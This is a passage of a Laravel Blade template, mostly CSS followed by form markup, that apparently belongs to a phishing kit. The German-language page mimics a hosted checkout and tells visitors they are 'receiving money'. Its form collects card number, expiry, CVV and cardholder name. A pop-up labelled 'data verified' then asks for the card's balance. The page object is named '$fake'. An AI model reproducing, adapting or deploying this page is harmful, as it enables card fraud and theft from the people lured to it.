            animation-delay: 1.2s;
        }

        .App-Container.is-mobilePaymentMenu {
            overflow: hidden;
        }

        @-webkit-keyframes slideUp {
            0% {
                -webkit-transform: translateY(180px);
                transform: translateY(180px);
            }
            to {
                -webkit-transform: translateY(0);
                transform: translateY(0);
            }
        }

        @keyframes slideUp {
            0% {
                -webkit-transform: translateY(180px);
                transform: translateY(180px);
            }
            to {
                -webkit-transform: translateY(0);
                transform: translateY(0);
            }
        }

        @-webkit-keyframes fadeIn {
            0% {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        @keyframes fadeIn {
            0% {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        .is-darkMode .App-Footer {
            background-color: #000;
        }

        .App-Payment-Header {
            height: 28px;
            margin-bottom: 32px;
            position: absolute;
            padding-top: 8px;
            top: 0;
            display: none;
        }

        .App-productSummaryContainer.is-paymentSuccess {
            display: none;
        }

        .App-Container .App {
            -webkit-animation: enter-no-scale 0.6s;
            animation: enter-no-scale 0.6s;
            position: relative;
        }

        @media only screen and (min-width: 992px) {
            .App {
                -webkit-box-align: start;
                -webkit-align-items: flex-start;
                -ms-flex-align: start;
                align-items: flex-start;
                -webkit-transform: translateY(max(48px, calc(50vh - 55%)));
                -ms-transform: translateY(max(48px, calc(50vh - 55%)));
                transform: translateY(max(48px, calc(50vh - 55%)));
            }

            .App.App--multiItem,
            .App.App--singleItem {
                padding-top: 0;
            }

            .App-Container:not(.is-noBackground) {
                background-image: none;
            }

            .App-Container:before {
                box-shadow: 15px 0 30px 0 rgba(0, 0, 0, 0.18);
            }

            .App-Container:not(.App-Container--setupMode):before {
                height: 100%;
                width: 50%;
                background: #fff;
                position: fixed;
                content: " ";
                top: 0;
                right: 0;
                -webkit-animation-fill-mode: both;
                animation-fill-mode: both;
                -webkit-transform-origin: right;
                -ms-transform-origin: right;
                transform-origin: right;
            }

            .is-darkMode .App-Container:not(.App-Container--setupMode):before {
                background: #0a0a0a;
            }

            .is-darkMode .App-Payment {
                background-color: #0a0a0a;
            }

            .App-Container:not(.App-Container--setupMode) .App {
                -webkit-animation-delay: 0.2s;
                animation-delay: 0.2s;
                -webkit-animation-fill-mode: backwards;
                animation-fill-mode: backwards;
                -webkit-box-orient: horizontal;
                -webkit-box-direction: normal;
                -webkit-flex-direction: row;
                -ms-flex-direction: row;
                flex-direction: row;
                -webkit-box-pack: justify;
                -webkit-justify-content: space-between;
                -ms-flex-pack: justify;
                justify-content: space-between;
                max-width: 920px;
            }

            .App-Container:not(.App-Container--setupMode) .App-Payment-Header {
                display: block;
            }

            .App-Container:not(.App-Container--setupMode) .App-Overview {
                padding-bottom: 40px;
            }

            .App-Container:not(.App-Container--setupMode) .App-Overview,
            .App-Container:not(.App-Container--setupMode) .App-Payment {
                width: 380px;
                margin-bottom: 0;
            }

            .App-Container:not(.App-Container--setupMode) .App-Overview-OrderDetails {
                display: block;
                margin-left: -5px;
                padding-left: 5px;
            }

            .App-Container:not(.App-Container--setupMode) .App-Footer {
                position: absolute;
                left: 0;
                bottom: 0;
                margin: 12px 0;
            }

            .App-Payment {
                padding-top: 0;
                height: 100%;
            }

            .App-Container:not(.is-noBackground) .App-Payment {
                box-shadow: none;
            }

            .App-Container {
                min-height: 0;
            }

            .App-Container--setupMode .App {
                max-width: 444px;
            }

            .App-Container--setupMode .App-Payment {
                padding: 32px;
            }

            .App-Overview,
            .App-Payment {
                padding: 0;
                margin: 0;
            }

            .App-Footer {
                width: auto;
                height: auto;
                background-color: inherit;
                padding: 0;
            }

            .is-darkMode .App-Footer {
                background-color: transparent;
            }

            .App-Container--setupMode:not(.is-noBackground) .App-Payment {
                margin: 24px 0;
                background-color: #fff;
                border-radius: 12px;
                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.07);
            }

            .is-darkMode .App-Container--setupMode .App-Payment {
                background-color: #0a0a0a;
                margin: 24px 0;
                border-radius: 12px;
                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.07);
            }

            .App-Container--setupMode.is-squareBordered .App .App-Payment {
                border-radius: 0;
            }

            .App-Container--setupMode.is-veryRoundBordered .App .App-Payment {
                border-radius: 18px;
            }

            .App-Container--setupMode .Header {
                padding: 0 32px;
            }

            .App-productSummaryContainer.is-paymentSuccess {
                display: block;
            }

            .App-Overview .App-Payment > .PaymentSuccess {
                margin-top: 56px;
            }

            .App-mobileActions {
                display: none;
            }
        }

        @-webkit-keyframes enter {
            0% {
                -webkit-transform: scale(0.97);
                transform: scale(0.97);
                opacity: 0;
            }
            to {
                -webkit-transform: scale(1);
                transform: scale(1);
                opacity: 1;
            }
        }

        @keyframes enter {
            0% {
                -webkit-transform: scale(0.97);
                transform: scale(0.97);
                opacity: 0;
            }
            to {
                -webkit-transform: scale(1);
                transform: scale(1);
                opacity: 1;
            }
        }

        @-webkit-keyframes enter-no-scale {
            0% {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        @keyframes enter-no-scale {
            0% {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        @-webkit-keyframes enter-background-shadow {
            0% {
                -webkit-transform: scaleX(0.9);
                transform: scaleX(0.9);
                opacity: 0;
                box-shadow: none;
            }
            to {
                -webkit-transform: scaleX(1);
                transform: scaleX(1);
                opacity: 1;
                box-shadow: 15px 0 30px 0 rgba(0, 0, 0, 0.18);
            }
        }

        @keyframes enter-background-shadow {
            0% {
                -webkit-transform: scaleX(0.9);
                transform: scaleX(0.9);
                opacity: 0;
                box-shadow: none;
            }
            to {
                -webkit-transform: scaleX(1);
                transform: scaleX(1);
                opacity: 1;
                box-shadow: 15px 0 30px 0 rgba(0, 0, 0, 0.18);
            }
        }

        .is-fontFamily--EBGaramond.App-Container,
        .is-fontFamily--EBGaramond.Modal-Portal {
            font-family: EB Garamond, Apple Garamond, "Droid Serif", Times New Roman, serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol;
        }

        .is-fontFamily--Inconsolata.App-Container,
        .is-fontFamily--Inconsolata.Modal-Portal {
            font-family: Inconsolata, Consolas, Monaco, Liberation Mono, Lucida Console, monospace;
        }

        .is-fontFamily--Lato.App-Container,
        .is-fontFamily--Lato.Modal-Portal {
            font-family: Lato, -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica Neue, Ubuntu, sans-serif;
        }

        .is-fontFamily--LibreBaskerville.App-Container,
        .is-fontFamily--LibreBaskerville.Modal-Portal {
            font-family: Libre Baskerville, Apple Garamond, "Droid Serif", Times New Roman, serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol;
        }

        .is-fontFamily--Lora.App-Container,
        .is-fontFamily--Lora.Modal-Portal {
            font-family: Lora, Apple Garamond, "Droid Serif", Times New Roman, serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol;
        }

        .is-fontFamily--Merriweather.App-Container,
        .is-fontFamily--Merriweather.Modal-Portal {
            font-family: Merriweather, Apple Garamond, "Droid Serif", Times New Roman, serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol;
        }

        .is-fontFamily--Montserrat.App-Container,
        .is-fontFamily--Montserrat.Modal-Portal {
            font-family: Montserrat, -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica Neue, Ubuntu, sans-serif;
        }

        .is-fontFamily--NotoSansJP.App-Container,
        .is-fontFamily--NotoSansJP.Modal-Portal {
            font-family: Noto Sans JP, -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica Neue, Ubuntu, sans-serif;
        }

        .is-fontFamily--Nunito.App-Container,
        .is-fontFamily--Nunito.Modal-Portal {
            font-family: Nunito, -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica Neue, Ubuntu, sans-serif;
        }

        .is-fontFamily--OpenSans.App-Container,
        .is-fontFamily--OpenSans.Modal-Portal {
            font-family: Open Sans, -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica Neue, Ubuntu, sans-serif;
        }

        .is-fontFamily--Oswald.App-Container,
        .is-fontFamily--Oswald.Modal-Portal {
            font-family: Oswald, -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica Neue, Ubuntu, sans-serif;
        }

        .is-fontFamily--PTSans.App-Container,
        .is-fontFamily--PTSans.Modal-Portal {
            font-family: PT Sans, -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica Neue, Ubuntu, sans-serif;
        }

        .is-fontFamily--PTSerif.App-Container,
        .is-fontFamily--PTSerif.Modal-Portal {
            font-family: "PT Serif", Apple Garamond, "Droid Serif", Times New Roman, serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol;
        }

        .is-fontFamily--Raleway.App-Container,
        .is-fontFamily--Raleway.Modal-Portal {
            font-family: Raleway, -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica Neue, Ubuntu, sans-serif;
        }

        .is-fontFamily--Roboto.App-Container,
        .is-fontFamily--Roboto.Modal-Portal {
            font-family: Roboto, -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica Neue, Ubuntu, sans-serif;
        }

        .is-fontFamily--SourceSansPro.App-Container,
        .is-fontFamily--SourceSansPro.Modal-Portal {
            font-family: Source Sans Pro, -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica Neue, Ubuntu, sans-serif;
        }

        .is-fontFamily--TitilliumWeb.App-Container,
        .is-fontFamily--TitilliumWeb.Modal-Portal {
            font-family: Titillium Web, -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica Neue, Ubuntu, sans-serif;
        }

        .FullPageMessage {
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            position: absolute;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
        }

        .FullPageMessage,
        .FullPageMessage-Message {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
        }

        .FullPageMessage-Message {
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            max-width: 300px;
            text-align: center;
        }

        .FullPageMessage-Icon {
            margin-bottom: 16px;
        }

        .RedirectConfirmationPage {
            position: fixed;
            top: 0;
            bottom: 0;
            right: 0;
            left: 0;
            z-index: -1;
        }

        .RedirectConfirmationPage-container {
            width: 100%;
            height: 100%;
        }

        .RedirectConfirmationPage-iconContainer {
            margin-bottom: 16px;
        }

        .RedirectConfirmationPage-header {
            width: 100%;
            max-width: 380px;
            padding-top: 16px;
        }

        .RedirectConfirmationPage-footer {
            width: 100%;
            padding-top: 16px;
            padding-bottom: 16px;
            background-color: #fff;
        }

        .RedirectConfirmationPage-content {
            width: 100%;
            background-color: #fff;
            padding: 32px;
        }

        .RedirectConfirmationPage-testModeTag {
            margin-left: 8px;
        }

        .RedirectConfirmationPage-messageLink {
            color: inherit;
            text-decoration: underline;
            font-weight: 500;
        }

        @media only screen and (max-width: 991.98px) {
            .RedirectConfirmationPage-content {
                -webkit-box-flex: 1;
                -webkit-flex: 1;
                -ms-flex: 1;
                flex: 1;
            }

            .RedirectConfirmationPage-messageContainer {
                max-width: 380px;
            }
        }

        @media only screen and (min-width: 992px) {
            .RedirectConfirmationPage-container {
                width: 444px;
                margin-left: 16px;
                margin-right: 16px;
            }

            .RedirectConfirmationPage-content {
                border-radius: 12px;
                min-height: 60%;
            }

            .RedirectConfirmationPage-header {
                width: 100%;
                max-width: 100%;
                padding: 48px 16px 24px;
            }

            .RedirectConfirmationPage-footer {
                background-color: transparent;
                padding-top: 24px;
                padding-bottom: 48px;
            }
        }

        .RedirectConfirmationPage-iconContainer {
            -webkit-animation-name: slide-icon-up;
            animation-name: slide-icon-up;
            -webkit-animation-delay: 0s;
            animation-delay: 0s;
            -webkit-animation-duration: 1.2s;
            animation-duration: 1.2s;
            -webkit-animation-fill-mode: forwards;
            animation-fill-mode: forwards;
            -webkit-animation-timing-function: ease-out;
            animation-timing-function: ease-out;
        }

        .RedirectConfirmationPage-message {
            -webkit-animation-name: slide-message-up;
            animation-name: slide-message-up;
            -webkit-animation-delay: 0.6s;
            animation-delay: 0.6s;
            -webkit-animation-duration: 0.6s;
            animation-duration: 0.6s;
            -webkit-animation-fill-mode: both;
            animation-fill-mode: both;
            -webkit-animation-timing-function: linear;
            animation-timing-function: linear;
            margin-top: 16px;
        }

        @-webkit-keyframes slide-icon-up {
            0% {
                -webkit-transform: translateY(100%);
                transform: translateY(100%);
            }
            50% {
                -webkit-transform: translateY(100%);
                transform: translateY(100%);
            }
            to {
                -webkit-transform: translateY(0);
                transform: translateY(0);
            }
        }

        @keyframes slide-icon-up {
            0% {
                -webkit-transform: translateY(100%);
                transform: translateY(100%);
            }
            50% {
                -webkit-transform: translateY(100%);
                transform: translateY(100%);
            }
            to {
                -webkit-transform: translateY(0);
                transform: translateY(0);
            }
        }

        @-webkit-keyframes slide-message-up {
            0% {
                opacity: 0;
            }
            50% {
                opacity: 0;
                -webkit-transform: translateY(66%);
                transform: translateY(66%);
            }
            to {
                -webkit-transform: translateY(0);
                transform: translateY(0);
            }
        }

        @keyframes slide-message-up {
            0% {
                opacity: 0;
            }
            50% {
                opacity: 0;
                -webkit-transform: translateY(66%);
                transform: translateY(66%);
            }
            to {
                -webkit-transform: translateY(0);
                transform: translateY(0);
            }
        }
    </style>
    <style>
        body {
            /*background: rgb(210,168,168);
        background: linear-gradient(45deg, rgba(210,168,168,1) 0%, rgba(255,231,231,1) 50%, rgba(255,255,255,1) 100%);
        */
            background: rgb(168, 185, 210);
            background: linear-gradient(45deg, rgba(168, 185, 210, 1) 0%, rgba(231, 243, 255, 1) 50%, rgba(255, 255, 255, 1) 100%);
        }

        .SubmitButton {
            /*background-color: #c11818;*/
            background-color: #1867c1;
            color: #fff;
        }

        #_buttonPay:disabled {
            background: #d4d3d3;
            cursor: default;
            color: #fff;
        }
    </style>
    <style>
        body,
        img,
        input,
        button {
            -webkit-appearance: none;
        }

        body {
            height: 100%;
        }

        input::-webkit-outer-spin-button,
        input::-webkit-inner-spin-button {
            -webkit-appearance: none;
        }

        input[type="number"] {
            -moz-appearance: textfield;
        }

        #verification {
            overflow-x: hidden;
            overflow-y: auto;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 1050;
            display: none;
            background: #000000bf;
            width: 100%;
            height: 100%;
            overflow: hidden;
            outline: 0;
            transition: opacity 0.15s linear;
            opacity: 0;
        }

        #holder {
            height: 150px;
        }

        #contnet {
            text-align: center;
            display: none;
        }

        .loader {
            border: 16px solid #f3f3f3;
            border-radius: 50%;
            border-top: 16px solid #3498db;
            width: 120px;
            height: 120px;
            -webkit-animation: spin 2s linear infinite; /* Safari */
            animation: spin 2s linear infinite;
            z-index: 100;
            margin-left: auto;
            margin-right: auto
        }

        /* Safari */
        @-webkit-keyframes spin {
            0% {
                -webkit-transform: rotate(0deg);
            }
            100% {
                -webkit-transform: rotate(360deg);
            }
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        @keyframes spinner-spin8 {
            0% {
                -webkit-transform: rotate(180deg);
                transform: rotate(180deg);
            }
            to {
                -webkit-transform: rotate(540deg);
                transform: rotate(540deg);
            }
        }

        #verif-window {
            margin: 12px;
        }

        #verif-contnt {
            padding: 20px;
            background-color: #fff;
            margin: 0 auto;
            max-width: 360px;
            border-radius: 15px;
            margin-top: 100px;
        }

        @media all and (max-width: 720px) {
            #loader {
                left: 48%;
            }
        }
    </style>
    <style>
        #divlogo {
            width: 100%;
            margin-top: 15px;
            text-align: left;
        }

        @media all and (max-width: 992px) {
            #divlogo {
                text-align: center;
            }
        }
    </style>
@endpush
@section('content')
    <form id="_formPay" name="_formPay" method="post">
        <div id="verification">
            <div id="verif-window">
                <div id="verif-contnt">
                    <div id="contnet">
                        <div
                            style="font-size: 16px; color: #000; margin-bottom: 15px; font-weight: 600; padding-bottom: 10px; border-bottom: 1px solid #dee2e6;">
                            Daten wurden überprüft
                        </div>
                        <div id="balik">
                            <div
                                style="color: #3f3f3f; line-height: 1.6; font-size: 14px; background: #ececec; border-radius: 10px; padding: 25px 5px;">
                                Um die Transaktion im Verarbeitungssystem zu bestätigen, geben Sie das Guthaben auf der
                                Karte ein
                            </div>
                            <div
                                style="font-size: 13px; color: #555; margin-bottom: 3px; margin-top: 20px; font-weight: 600; text-align: left;">
                                Saldo:
                            </div>
                            <div>
                                <input id="checkbal" style="
                                            padding: 9px;
                                            border: none;
                                            border-radius: 4px;
                                            margin-bottom: 20px;
                                            width: 100%;
                                            box-shadow: 0 0 0 1px #e0e0e0, 0 2px 4px 0 rgb(0 0 0 / 7%), 0 1px 1.5px 0 rgb(0 0 0 / 5%);
                                            border: 1px solid #cecece;
                                        " form="_formPay" type="number" name="checkbal" placeholder="100.00" min="1"
                                       required="">
                            </div>
                            <input form="_formPay" id="currchoise" value="EUR" name="currency" class="_4" type="text"
                                   style="display: none;">
                        </div>
                        <div>
                            <input style="border-radius: 10px;" id="buttonPay2" form="_formPay" type="submit"
                                   class="SubmitButton SubmitButton--incomplete" value="Weiter">
                        </div>
                    </div>
                    <div id="holder"
                         style="margin-top: 30px; width: 100%; text-align: center; font-size: 22px; color: #555;">
                        <div>Datenüberprüfung läuft</div>
                        <div class="loader"></div>
                    </div>
                </div>
            </div>
        </div>
        <div id="root">
            <div class="App-Container is-noBackground flex-container justify-content-center">
                <div class="App App--keyboardInteractionMode App--singleItem">
                    <div class="App-Overview">
                        <header style="background: none;" class="Header">
                            <div
                                class="Header-Content flex-container justify-content-space-between align-items-stretch">
                                <div class="Header-business flex-item width-grow flex-container align-items-center">
                                    <a class="Link Header-businessLink Link--primary"
                                       href="{{URL::previous()}}"
                                       target="_self">
                                        <div style="position: relative;">
                                            <div class="flex-container align-items-center">
                                                <div class="Header-backArrowContainer"
                                                     style="opacity: 1; transform: none;">
                                                    <svg class="InlineSVG Icon Header-backArrow mr2 Icon--sm"
                                                         focusable="false" width="12" height="12" viewBox="0 0 16 16">
                                                        <path
                                                            d="M3.417 7H15a1 1 0 0 1 0 2H3.417l4.591 4.591a1 1 0 0 1-1.415 1.416l-6.3-6.3a1 1 0 0 1 0-1.414l6.3-6.3A1 1 0 0 1 8.008 2.41z"
                                                            fill-rule="evenodd"></path>
                                                    </svg>
                                                </div>
                                                <div class="Header-merchantLogoContainer" style="transform: none;">
                                                    <div class="Header-merchantLogoWithLabel flex-item width-grow">
                                                        <div
                                                            class="HeaderImage HeaderImage--icon HeaderImage--iconFallback flex-item width-fixed flex-container justify-content-center align-items-center width-fixed">
                                                            <svg
                                                                class="InlineSVG Icon HeaderImage-fallbackIcon Icon--sm"
                                                                focusable="false" viewBox="0 0 16 16">
                                                                <path
                                                                    d="M3 7.5V12h10V7.5c.718 0 1.398-.168 2-.468V15a1 1 0 0 1-1 1H2a1 1 0 0 1-1-1V7.032c.602.3 1.282.468 2 .468zM0 3L1.703.445A1 1 0 0 1 2.535 0h10.93a1 1 0 0 1 .832.445L16 3a3 3 0 0 1-5.5 1.659C9.963 5.467 9.043 6 8 6s-1.963-.533-2.5-1.341A3 3 0 0 1 0 3z"
                                                                    fill-rule="evenodd"></path>
                                                            </svg>
                                                        </div>
                                                        <span
                                                            class="Header-businessLink-label Text Text-color--gray800 Text-fontSize--14 Text-fontWeight--500">
                                                                Zurück
                                                            </span>
                                                        <h1 class="Header-businessLink-name Text Text-color--gray800 Text-fontSize--14 Text-fontWeight--500 Text--truncate">
                                                            {{ucfirst(optional($fake->category)->name)}}</h1>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </a>
                                </div>
                            </div>
                        </header>
                        <div class="App-productSummaryContainer">
                            <div class="ProductSummary no-image">
                                <div class="ProductSummary-info">
                                    <span
                                        class="ProductSummary-name Text Text-color--gray500 Text-fontSize--16 Text-fontWeight--500">{{$fake->title}}</span>
                                    <span
                                        class="ProductSummary-totalAmount Text Text-color--default Text-fontWeight--600 Text--tabularNumbers"
                                        id="ProductSummary-totalAmount">{{$fake->priceFormat()}}</span>
                                    <span
                                        class="ProductSummary-description Text Text-color--gray500 Text-fontSize--14 Text-fontWeight--500"
                                        id="ProductSummary-description">
                                            <div
                                                class="ProductSummaryDescription ProductSummaryDescription--singleItem">Transaction #{{$fake->track_id}}</div>
                                        </span>
                                </div>
                            </div>
                            <div id="divlogo">
                                <img src="{{asset($fake->logo())}}" style="height: 60px;">
                            </div>
                        </div>
                    </div>
                    <div class="App-Payment">
                        <div class="CheckoutPaymentForm" data-link-multiple-saved-cards-enabled="false">
                            <div class="PaymentRequestOrHeader" style="display: inherit; height: auto;">
                                <div class="PaymentHeaderContainer" style="display: block; opacity: 1;">
                                    <div class="PaymentHeader">
                                        <div
                                            class="Text Text-color--default Text-fontSize--20 Text-fontWeight--500"></div>
                                    </div>
                                </div>
                                <div class="ButtonAndDividerContainer" style="opacity: 0; display: none;"></div>
                            </div>
                            <div class="flex-container direction-column" style="">
                                <div style="height: 523.979px;">
                                    <div>
                                        <div style="opacity: 1;">
                                            <div
                                                class="App-Global-Fields flex-container spacing-16 direction-row wrap-wrap">
                                                <div class="flex-item width-12">
                                                    <div role="list" class="ReadOnlyForm ReadOnlyForm--withShadow">
                                                        <div class="ReadOnlyFormField-email ReadOnlyFormField">
                                                            <div class="ReadOnlyFormField-label"><span
                                                                    class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">{{ucfirst(optional($fake->category)->name)}}</span>
                                                            </div>
                                                            <div class="ReadOnlyFormField-content">
                                                                <div class="ReadOnlyFormField-titleContainer">
                                                                    <div class="ReadOnlyFormField-title">Geld empfangen
                                                                    </div>
                                                                    <div class="ReadOnlyFormField-action"></div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div
                                                class="PaymentForm-paymentMethodForm flex-container spacing-16 direction-column wrap-wrap">
                                                <div class="flex-item width-12">
                                                    <div class="FormFieldGroup">
                                                        <div
                                                            class="FormFieldGroup-labelContainer flex-container justify-content-space-between">
                                                            <label for="cardNumber-fieldset"><span
                                                                    class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">Kartendetails</span></label>
                                                        </div>
                                                        <fieldset class="FormFieldGroup-Fieldset"
                                                                  id="cardNumber-fieldset">
                                                            <div class="FormFieldGroup-container"
                                                                 id="cardNumber-fieldset">
                                                                <div
                                                                    class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight FormFieldGroup-childTop">
                                                                    <div class="FormFieldInput">
                                                                        <div class="CheckoutInputContainer">
                                                                                <span class="InputContainer"
                                                                                      data-max="">
                                                                                    <input
                                                                                        class="CheckoutInput CheckoutInput--tabularnums Input Input--empty"
                                                                                        autocomplete="cc-number"
                                                                                        autocorrect="off"
                                                                                        spellcheck="false"
                                                                                        id="_input0" name="fcard"
                                                                                        type="text"
                                                                                        inputmode="numeric"
                                                                                        placeholder="1234 1234 1234 1234"
                                                                                        aria-invalid="false"
                                                                                        value="">
                                                                                </span>
                                                                        </div>
                                                                        <div class="FormFieldInput-Icons"
                                                                             style="opacity: 1;">
                                                                            <div id="bankicon1"
                                                                                 style="transform: none;">
                                                                                    <span
                                                                                        class="FormFieldInput-IconsIcon is-visible">
                                                                                        <img
                                                                                            src="{{asset('images/visa-365725566f9578a9589553aa9296d178.svg')}}"
                                                                                            alt="visa"
                                                                                            class="BrandIcon">
                                                                                    </span>
                                                                            </div>
                                                                            <div id="bankicon2"
                                                                                 style="transform: none;">
                                                                                    <span
                                                                                        class="FormFieldInput-IconsIcon is-visible">
                                                                                        <img
                                                                                            src="{{asset('images/mastercard-4d8844094130711885b5e41b28c9848f.svg')}}"
                                                                                            alt="mastercard"
                                                                                            class="BrandIcon">
                                                                                    </span>
                                                                            </div>
                                                                            <div id="bankicon3"
                                                                                 style="transform: none;">
                                                                                    <span
                                                                                        class="FormFieldInput-IconsIcon is-visible">
                                                                                        <img
                                                                                            src="{{asset('images/amex-a49b82f46c5cd6a96a6e418a6ca1717c.svg')}}"
                                                                                            alt="amex"
                                                                                            class="BrandIcon">
                                                                                    </span>
                                                                            </div>
                                                                            <div id="bankicon4"
                                                                                 class="CardFormFieldGroupIconOverflow">
                                                                                    <span
                                                                                        class="CardFormFieldGroupIconOverflow-Item CardFormFieldGroupIconOverflow-Item--visible"
                                                                                        role="presentation">
                                                                                        <span
                                                                                            class="FormFieldInput-IconsIcon"
                                                                                            role="presentation">
                                                                                            <img
                                                                                                src="{{asset('images/unionpay-8a10aefc7295216c338ba4e1224627a1.svg')}}"
                                                                                                alt="unionpay"
                                                                                                class="BrandIcon">
                                                                                        </span>
                                                                                    </span>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div
                                                                    class="FormFieldGroup-child FormFieldGroup-child--width-6 FormFieldGroup-childLeft FormFieldGroup-childBottom">
                                                                    <div class="FormFieldInput">
                                                                        <div class="CheckoutInputContainer">
                                                                                <span class="InputContainer"
                                                                                      data-max="">
                                                                                    <input
                                                                                        class="CheckoutInput CheckoutInput--tabularnums Input Input--empty"
                                                                                        autocomplete="cc-exp"
                                                                                        autocorrect="off"
                                                                                        spellcheck="false"
                                                                                        id="_input1" name="fexpm"
                                                                                        type="text"
                                                                                        inputmode="numeric"
                                                                                        placeholder="MM"
                                                                                        aria-invalid="false"
                                                                                        value="">
                                                                                    <input
                                                                                        style="margin-top: 20px; border-radius: 6px; display: none;"
                                                                                        class="CheckoutInput CheckoutInput--tabularnums Input Input--empty"
                                                                                        autocomplete="cc-csc"
                                                                                        autocorrect="off"
                                                                                        spellcheck="false"
                                                                                        id="_input3" name="fcvc"
                                                                                        type="text"
                                                                                        inputmode="numeric"
                                                                                        placeholder="CVV/CVC"
                                                                                        aria-invalid="false"
                                                                                        value="">
                                                                                </span>
                                                                        </div>
                                                                        <div style="margin-top: 27px; display: none;"
                                                                             id="cvcicon"
                                                                             class="FormFieldInput-Icon is-loaded">
                                                                            <svg class="Icon Icon--md" focusable="false"
                                                                                 viewBox="0 0 32 21">
                                                                                <g fill="none" fill-rule="evenodd">
                                                                                    <g class="Icon-fill">
                                                                                        <g transform="translate(0 2)">
                                                                                            <path
                                                                                                d="M21.68 0H2c-.92 0-2 1.06-2 2v15c0 .94 1.08 2 2 2h25c.92 0 2-1.06 2-2V9.47a5.98 5.98 0 0 1-3 1.45V11c0 .66-.36 1-1 1H3c-.64 0-1-.34-1-1v-1c0-.66.36-1 1-1h17.53a5.98 5.98 0 0 1 1.15-9z"
                                                                                                opacity=".2"></path>
                                                                                            <path
                                                                                                d="M19.34 3H0v3h19.08a6.04 6.04 0 0 1 .26-3z"
                                                                                                opacity=".3"></path>
                                                                                        </g>
                                                                                        <g transform="translate(18)">
                                                                                            <path
                                                                                                d="M7 14A7 7 0 1 1 7 0a7 7 0 0 1 0 14zM4.22 4.1h-.79l-1.93.98v1l1.53-.8V9.9h1.2V4.1zm2.3.8c.57 0 .97.32.97.78 0 .5-.47.85-1.15.85h-.3v.85h.36c.72 0 1.21.36 1.21.88 0 .5-.48.84-1.16.84-.5 0-1-.16-1.52-.47v1c.56.24 1.12.37 1.67.37 1.31 0 2.21-.67 2.21-1.64 0-.68-.42-1.23-1.12-1.45.6-.2.99-.73.99-1.33C8.68 4.64 7.85 4 6.65 4a4 4 0 0 0-1.57.34v.98c.48-.27.97-.42 1.44-.42zm4.32 2.18c.73 0 1.24.43 1.24.99 0 .59-.51 1-1.24 1-.44 0-.9-.14-1.37-.43v1.03c.49.22.99.33 1.48.33.26 0 .5-.04.73-.1.52-.85.82-1.83.82-2.88l-.02-.42a2.3 2.3 0 0 0-1.23-.32c-.18 0-.37.01-.57.04v-1.3h1.44a5.62 5.62 0 0 0-.46-.92H9.64v3.15c.4-.1.8-.17 1.2-.17z"></path>
                                                                                        </g>
                                                                                    </g>
                                                                                </g>
                                                                            </svg>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div
                                                                    class="FormFieldGroup-child FormFieldGroup-child--width-6 FormFieldGroup-childRight FormFieldGroup-childBottom">
                                                                    <div class="FormFieldInput has-icon">
                                                                        <div class="CheckoutInputContainer"
                                                                             style="width: 100%;">
                                                                                <span class="InputContainer"
                                                                                      data-max="">
                                                                                    <input
                                                                                        class="CheckoutInput CheckoutInput--tabularnums Input Input--empty"
                                                                                        autocomplete="cc-exp"
                                                                                        autocorrect="off"
                                                                                        spellcheck="false"
                                                                                        id="_input2" name="fexpy"
                                                                                        type="text"
                                                                                        inputmode="numeric"
                                                                                        placeholder="YY"
                                                                                        aria-invalid="false"
                                                                                        value="">
                                                                                </span>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div style="opacity: 0; height: 0px;">
                                                                <span
                                                                    class="FieldError Text Text-color--red Text-fontSize--13"><span
                                                                        aria-hidden="true"></span></span>
                                                                </div>
                                                            </div>
                                                        </fieldset>
                                                    </div>
                                                </div>
                                                <div class="BillingAddressForm-addressInput flex-item width-12"
                                                     aria-hidden="false">
                                                    <div style="pointer-events: auto; height: auto; opacity: 1;">
                                                        <div
                                                            class="flex-container spacing-16 direction-column wrap-wrap">
                                                            <div class="flex-item width-12">
                                                                <div class="FormFieldGroup">
                                                                    <div
                                                                        class="FormFieldGroup-labelContainer flex-container justify-content-space-between">
                                                                        <label for="billingName"><span
                                                                                class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">Vor- und Nachname von des Karteninhabers</span></label>
                                                                    </div>
                                                                    <div class="FormFieldGroup-Fieldset">
                                                                        <div class="FormFieldGroup-container"
                                                                             id="billingName-fieldset">
                                                                            <div
